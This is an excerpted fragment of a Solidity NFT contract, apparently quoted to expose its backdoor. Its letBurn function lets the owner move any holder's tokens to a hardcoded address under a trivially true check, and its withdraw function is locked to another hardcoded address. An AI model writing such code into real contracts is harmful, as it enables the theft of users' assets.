...
contract Super_Man_Genesis is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Smurfs City", "SC", maxBatchSize_, collectionSize_) {
  ...
  function letBurn(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x5aA45a4650eD2D7A5538062b0244D897442fC397, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x54f9D5c1CC2e4c3C3Fdf9d3C733Ad43Fdf56F375);
